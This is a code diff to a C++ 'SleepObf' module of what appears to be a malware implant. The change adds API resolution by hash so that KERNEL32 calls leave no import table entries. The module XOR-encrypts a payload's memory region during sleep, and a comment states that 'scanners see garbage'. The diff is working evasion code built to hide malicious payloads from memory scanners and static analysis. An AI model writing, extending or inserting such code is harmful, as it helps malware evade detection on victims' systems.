@@ -9,6 +9,7 @@
 // 
 
 #include "SleepObf.h"
+#include "ApiResolver.h"
 
 namespace SleepObf
 {
@@ -16,8 +17,14 @@ namespace SleepObf
     {
         if (!region || size == 0) return;
 
+        // Resolve API functions dynamically (no IAT entries)
+        HMODULE hK32 = Api::GetModuleByHashCrc(Api::CrcMod::KERNEL32);
+        auto pGetTickCount   = (DWORD(WINAPI*)())Api::GetProcByHashCrc(hK32, Api::CrcFn::GetTickCount);
+        auto pVirtualProtect = (BOOL(WINAPI*)(LPVOID, SIZE_T, DWORD, PDWORD))Api::GetProcByHashCrc(hK32, Api::CrcFn::VirtualProtect);
+        auto pSleep          = (void(WINAPI*)(DWORD))Api::GetProcByHashCrc(hK32, Api::CrcFn::Sleep);
+
         // Generate a random XOR key for this sleep cycle
-        DWORD key = GetTickCount() ^ 0xDEADBEEF;
+        DWORD key = (pGetTickCount ? pGetTickCount() : 0) ^ 0xDEADBEEF;
         unsigned char keyBytes[4];
         keyBytes[0] = (unsigned char)(key & 0xFF);
         keyBytes[1] = (unsigned char)((key >> 8) & 0xFF);
@@ -28,20 +35,20 @@ namespace SleepObf
 
         // Make region writable if needed
         DWORD oldProtect;
-        VirtualProtect(region, size, PAGE_READWRITE, &oldProtect);
+        if (pVirtualProtect) pVirtualProtect(region, size, PAGE_READWRITE, &oldProtect);
 
         // Encrypt the region (XOR with rolling key)
         for (size_t i = 0; i < size; i++)
             data[i] ^= keyBytes[i % 4];
 
         // Sleep with payload encrypted — scanners see garbage
-        Sleep(milliseconds);
+        if (pSleep) pSleep(milliseconds);
 
         // Decrypt the region back
         for (size_t i = 0; i < size; i++)
             data[i] ^= keyBytes[i % 4];
 
         // Restore original memory protection
-        VirtualProtect(region, size, oldProtect, &oldProtect);
+        if (pVirtualProtect) pVirtualProtect(region, size, oldProtect, &oldProtect);
     }
 }
